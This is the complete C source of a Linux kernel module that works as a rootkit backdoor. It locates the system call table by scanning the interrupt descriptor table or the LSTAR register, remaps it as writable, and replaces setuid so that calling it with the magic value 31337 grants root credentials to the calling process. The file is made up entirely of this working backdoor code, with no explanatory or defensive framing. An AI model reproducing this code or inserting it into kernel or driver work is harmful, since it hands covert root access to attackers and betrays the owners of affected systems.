#include <linux/module.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <asm/unistd.h>

#ifdef CONFIG_IA32_EMULATION
#include "unistd_32.h"
#endif


#ifdef __i386__
struct idt_descriptor {
    unsigned short offset_low;
    unsigned short selector;
    unsigned char zero;
    unsigned char type_flags;
    unsigned short offset_high;
} __attribute__ ((packed));
#elif defined(CONFIG_IA32_EMULATION)
struct idt_descriptor {
    unsigned short offset_low;
    unsigned short selector;
    unsigned char zero1;
    unsigned char type_flags;
    unsigned short offset_middle;
    unsigned int offset_high;
    unsigned int zero2;
} __attribute__ ((packed));
#endif

struct idtr {
    unsigned short limit;
    void *base;
} __attribute__ ((packed));


void **sys_call_table;
#ifdef CONFIG_IA32_EMULATION
void **ia32_sys_call_table;
#endif


asmlinkage long (*real_setuid)(uid_t uid);

asmlinkage long hooked_setuid(uid_t uid) {
    if (uid == 31337) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,29)
        struct cred *cred = prepare_creds();
        cred->uid = cred->suid = cred->euid = cred->fsuid = 0;
        cred->gid = cred->sgid = cred->egid = cred->fsgid = 0;
        return commit_creds(cred);
#else
        current->uid = current->euid = current->suid = current->fsuid = 0;
        current->gid = current->egid = current->sgid = current->fsgid = 0;
        return 0;
#endif
    }
    return real_setuid(uid);
}


#if defined(__i386__) || defined(CONFIG_IA32_EMULATION)
#ifdef __i386__
void *get_sys_call_table(void) {
#elif defined(__x86_64__)
void *get_ia32_sys_call_table(void) {
#endif
    struct idtr idtr;
    struct idt_descriptor idtd;
    void *system_call;
    unsigned char *ptr;
    int i;

    asm volatile("sidt %0" : "=m"(idtr));

    memcpy(&idtd, idtr.base + 0x80*sizeof(idtd), sizeof(idtd));

#ifdef __i386__
    system_call = (void*)((idtd.offset_high<<16) | idtd.offset_low);
#elif defined(__x86_64__)
    system_call = (void*)(((long)idtd.offset_high<<32) |
                        (idtd.offset_middle<<16) | idtd.offset_low);
#endif

    for (ptr=system_call, i=0; i<500; i++) {
#ifdef __i386__
        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0x85)
            return *((void**)(ptr+3));
#elif defined(__x86_64__)
        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
            return (void*) (0xffffffff00000000 | *((unsigned int*)(ptr+3)));
#endif
        ptr++;
    }

    return NULL;
}
#endif


#ifdef __x86_64__
#define IA32_LSTAR  0xc0000082

void *get_sys_call_table(void) {
    void *system_call;
    unsigned char *ptr;
    int i, low, high;

    asm volatile("rdmsr" : "=a" (low), "=d" (high) : "c" (IA32_LSTAR));

    system_call = (void*)(((long)high<<32) | low);

    for (ptr=system_call, i=0; i<500; i++) {
        if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5)
            return (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
        ptr++;
    }   

    return NULL;
}
#endif


void *get_writable_sct(void *sct_addr) {
    struct page *p[2];
    void *sct;
    unsigned long addr = (unsigned long)sct_addr & PAGE_MASK;

    if (sct_addr == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,22) && defined(__x86_64__)
    p[0] = pfn_to_page(__pa_symbol(addr) >> PAGE_SHIFT);
    p[1] = pfn_to_page(__pa_symbol(addr + PAGE_SIZE) >> PAGE_SHIFT);
#else
    p[0] = virt_to_page(addr);
    p[1] = virt_to_page(addr + PAGE_SIZE);
#endif
    sct = vmap(p, 2, VM_MAP, PAGE_KERNEL);
    if (sct == NULL)
        return NULL;
    return sct + offset_in_page(sct_addr);
}

static int __init hook_init(void) {
    sys_call_table = get_writable_sct(get_sys_call_table());
    if (sys_call_table == NULL)
        return -1;

#ifdef CONFIG_IA32_EMULATION
    ia32_sys_call_table = get_writable_sct(get_ia32_sys_call_table());
    if (ia32_sys_call_table == NULL) {
        vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
        return -1;
    }
#endif

    /* hook setuid */
#ifdef __NR_setuid32
    real_setuid = sys_call_table[__NR_setuid32];
    sys_call_table[__NR_setuid32] = hooked_setuid;
#else
    real_setuid = sys_call_table[__NR_setuid];
    sys_call_table[__NR_setuid] = hooked_setuid;
#endif
#ifdef CONFIG_IA32_EMULATION
#ifdef __NR32_setuid32
    ia32_sys_call_table[__NR32_setuid32] = hooked_setuid;
#else
    ia32_sys_call_table[__NR32_setuid] = hooked_setuid;
#endif
#endif
    /***************/

    return 0;
}

static void __exit hook_exit(void) {
    /* unhook setuid */
#ifdef __NR_setuid32
    sys_call_table[__NR_setuid32] = real_setuid;
#else
    sys_call_table[__NR_setuid] = real_setuid;
#endif
#ifdef CONFIG_IA32_EMULATION
#ifdef __NR32_setuid32
    ia32_sys_call_table[__NR32_setuid32] = real_setuid;
#else
    ia32_sys_call_table[__NR32_setuid] = real_setuid;
#endif
#endif
    /*****************/

    // unmap memory
    vunmap((void*)((unsigned long)sys_call_table & PAGE_MASK));
#ifdef CONFIG_IA32_EMULATION
    vunmap((void*)((unsigned long)ia32_sys_call_table & PAGE_MASK));
#endif
}

module_init(hook_init);
module_exit(hook_exit);
MODULE_LICENSE("GPL");
